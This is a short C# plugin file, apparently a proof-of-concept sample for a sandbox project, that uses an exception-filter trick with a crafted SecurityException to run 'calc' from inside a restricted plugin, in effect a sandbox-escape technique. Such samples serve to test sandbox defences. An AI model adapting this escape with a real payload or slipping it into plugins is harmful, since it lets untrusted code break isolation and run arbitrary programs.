using System;
using System.Diagnostics;
using System.Security;
using System.Security.Permissions;
using Sandbox.Core.API;
using VBLibrary;

namespace Sandbox.Plugin
{
    public class ExceptionFilterAttackSample : IPlugin
    {
        public void Run()
        {
            var executionHelper = new ExecutionHelper("calc");
            var exceptionHandler = new ExceptionHandler(
                () =>
                {
                    new SecurityException("", null, null, null, new object(), null);
                },
                executionHelper.GetExecuteFunc(), 
                () => {});

            exceptionHandler.Execute();
        }

    }
}